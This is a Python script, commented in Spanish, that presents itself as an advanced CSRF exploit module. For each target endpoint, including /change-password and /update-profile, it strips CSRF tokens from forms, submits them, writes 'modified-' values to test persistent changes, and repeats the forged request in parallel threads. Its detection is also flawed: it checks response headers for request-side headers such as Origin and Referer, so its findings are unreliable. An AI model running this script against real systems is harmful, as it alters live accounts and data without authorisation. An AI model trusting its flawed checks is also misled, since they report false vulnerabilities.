import requests
from bs4 import BeautifulSoup
import threading

def execute(target):
    """
    Exploit avanzado para detectar y explotar vulnerabilidades de CSRF con escenarios extendidos.
    """
    print(f"[INFO] Probando CSRF en: {target}")
    endpoints = ["/login", "/update-profile", "/change-password", "/api/data", "/settings"]
    vulnerable = False
    results = []

    def simulate_malicious_request(url, form_data, method="POST", headers=None):
        """
        Simula una solicitud maliciosa sin token CSRF o cabeceras de seguridad.
        """
        try:
            if method == "POST":
                response = requests.post(url, data=form_data, headers=headers, timeout=5)
            elif method == "GET":
                response = requests.get(url, params=form_data, headers=headers, timeout=5)
            elif method == "PUT":
                response = requests.put(url, data=form_data, headers=headers, timeout=5)
            elif method == "DELETE":
                response = requests.delete(url, headers=headers, timeout=5)
            else:
                response = None
            return response
        except requests.RequestException as e:
            print(f"[ERROR] Error al enviar solicitud maliciosa a {url}: {e}")
            return None

    def test_protection_headers(headers):
        """
        Verifica si las cabeceras relacionadas con protección CSRF están presentes y configuradas correctamente.
        """
        protection_headers = ["Origin", "Referer", "X-CSRF-Token"]
        for header in protection_headers:
            if header not in headers:
                print(f"[ALERTA] Cabecera de protección ausente: {header}")
                results.append(f"Cabecera ausente: {header}")
                return False
        return True

    def validate_persistence(url, original_data, method="POST"):
        """
        Verifica si la explotación de CSRF impacta en el estado persistente del servidor.
        """
        modified_data = {key: f"modified-{value}" for key, value in original_data.items()}
        response = simulate_malicious_request(url, modified_data, method)
        if response and all(f"modified-{value}" in response.text for value in original_data.values()):
            print(f"[ALERTA] CSRF impacta la persistencia en {url}")
            results.append(f"Persistencia comprometida: {url}")
            return True
        return False

    def test_multithreaded_exploitation(url, form_data, threads=5):
        """
        Simula explotación CSRF desde múltiples usuarios simultáneos.
        """
        def exploit_thread():
            simulate_malicious_request(url, form_data)

        print(f"[INFO] Probando explotación multithread en {url}")
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=exploit_thread)
            thread_list.append(t)
            t.start()

        for t in thread_list:
            t.join()

    for endpoint in endpoints:
        url = f"http://{target}{endpoint}"
        try:
            print(f"[INFO] Probando endpoint: {url}")
            response = requests.get(url, timeout=5)

            if response.status_code != 200:
                print(f"[INFO] Endpoint no accesible o requiere autenticación: {url}")
                continue

            # Verificar cabeceras de protección
            if not test_protection_headers(response.headers):
                vulnerable = True

            # Analizar formularios HTML
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")
            if not forms:
                print(f"[INFO] No se encontraron formularios en {url}")
                continue

            for form in forms:
                # Extraer datos del formulario
                form_data = {}
                for input_tag in form.find_all("input"):
                    name = input_tag.get("name")
                    value = input_tag.get("value", "")
                    if name:
                        form_data[name] = value

                # Detectar método del formulario
                method = form.get("method", "POST").upper()

                # Detectar token CSRF
                csrf_tokens = [key for key in form_data if "csrf" in key.lower() or "token" in key.lower()]
                for token in csrf_tokens:
                    del form_data[token]

                # Probar sin token CSRF
                headers = {"User-Agent": "CSRF-Tester/2.0"}
                malicious_response = simulate_malicious_request(url, form_data, method, headers)

                if malicious_response and malicious_response.status_code == 200:
                    print(f"[ALERTA] CSRF detectado en {url} (sin token CSRF)")
                    results.append(f"CSRF detectado en {url} (sin token CSRF)")
                    vulnerable = True

                # Validar persistencia
                if validate_persistence(url, form_data, method):
                    vulnerable = True

                # Prueba multithread
                test_multithreaded_exploitation(url, form_data)

        except Exception as e:
            print(f"[ERROR] Error al probar CSRF en {url}: {e}")

    return " | ".join(results) if vulnerable else "No vulnerable a CSRF"
